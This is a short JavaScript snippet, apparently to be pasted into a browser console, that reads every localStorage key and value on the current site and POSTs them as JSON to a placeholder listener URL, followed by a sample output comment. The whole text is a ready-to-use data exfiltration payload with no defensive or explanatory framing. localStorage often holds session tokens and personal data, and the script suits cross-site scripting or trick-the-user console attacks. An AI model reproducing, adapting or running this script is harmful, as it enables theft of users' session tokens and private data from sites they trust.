// Execute this script in the browser console
const localStorageData = [];
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData.push({ key, value });
}

const localStorageJSON = JSON.stringify(localStorageData, null, 2);

const apiUrl = '{LISTENING_API_URL}/localstorage';

fetch(apiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: localStorageJSON,
});


// Output:
// [
//     {"key": "exampleKey1", "value": "exampleValue1"},
//     {"key": "exampleKey2", "value": "exampleValue2"}
// ]
